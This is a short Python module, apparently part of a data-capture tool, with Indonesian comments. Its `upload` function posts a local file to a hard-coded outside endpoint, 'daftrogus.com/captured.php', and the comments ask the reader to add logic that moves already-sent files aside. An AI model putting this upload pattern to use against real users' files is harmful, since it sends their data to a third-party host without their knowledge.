import requests

def upload(file_dir):
    print("[ISUP] Uploading Data")
    print()
    # Uploading data
    url = 'https://daftrogus.com/captured.php'
    # Disini kamu kasih logic nanti kalo ada file yg belum di upload
    # Macem kalo udah di upload pindahin ke dir lain biar ga kena cek lagi.. gitu gitu
    # Coba atur aja, biar sekalian belajar..
    # okok, dicoba aja. kalo error ya coba debugging sendiri. Biar belajar
    # jalan kok, paling responsenya nanti macem error : url undefined ato apa gitu
    files = {'uploaded_file': open(f"{file_dir}", 'rb')}
    response = requests.post(url, files=files)
    return response.content
